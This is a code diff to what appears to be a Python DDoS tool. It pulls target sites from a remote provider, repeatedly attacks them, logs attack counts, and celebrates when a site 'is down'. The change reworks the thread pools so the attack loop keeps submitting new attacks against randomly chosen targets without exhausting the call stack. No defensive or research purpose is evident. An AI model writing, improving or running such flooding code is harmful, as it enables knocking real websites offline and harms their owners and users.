@@ -40,7 +40,8 @@ proxy_view = args.proxy_view
 
 remoteProvider = RemoteProvider(args.targets)
 threads = int(args.threads)
-executor = ThreadPoolExecutor(max_workers=threads * 2)
+executor_init = ThreadPoolExecutor(max_workers=threads)
+executor_main = ThreadPoolExecutor(max_workers=threads)
 
 logger.remove()
 logger.add(
@@ -101,14 +102,14 @@ def mainth(site: str):
                 logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response.status_code}")
         if attacks_number > 0:
             logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
-        mainth(choice(remoteProvider.get_target_sites()))
+        executor_main.submit(mainth, choice(remoteProvider.get_target_sites()))
     except ConnectionError as exc:
         logger.success(f"{site} is down! =^_^=")
         # when thread is about to finish, just re-start its task
-        mainth(choice(remoteProvider.get_target_sites()))
+        executor_main.submit(mainth, choice(remoteProvider.get_target_sites()))
     except Exception as exc:
         logger.warning(f"Error: {exc}; number of successful attacks: {attacks_number}")
-        mainth(choice(remoteProvider.get_target_sites()))
+        executor_main.submit(mainth, choice(remoteProvider.get_target_sites()))
 
 def clear():
     if platform.system() == "Linux":
@@ -134,4 +135,4 @@ if __name__ == '__main__':
     sites = remoteProvider.get_target_sites()
     # initially start as many tasks as configured threads
     for _ in range(threads):
-        executor.submit(mainth, choice(remoteProvider.get_target_sites()))
+        executor_init.submit(mainth, choice(remoteProvider.get_target_sites()))
